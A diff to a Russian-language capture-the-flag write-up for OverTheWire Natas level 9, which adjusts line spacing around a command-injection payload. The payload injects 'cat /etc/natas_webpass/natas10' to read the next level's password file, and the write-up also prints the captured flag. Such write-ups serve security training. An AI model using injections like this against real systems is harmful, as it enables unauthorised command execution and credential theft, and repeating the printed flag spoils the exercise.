@@ -20,7 +20,9 @@
 ![Команда поиска](img/natas9/natas9_3.png)
 
 Выводим флаг от этой лабораторки при помощи уязвимости Command Injection  
-:space_invader: Payload: ``; cat /etc/natas_webpass/natas10; # ``
+
+:space_invader: Payload: ``; cat /etc/natas_webpass/natas10; # ``  
+
 ![Получение флага](img/natas9/natas9_4.png)
 
 Полученный флаг: D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
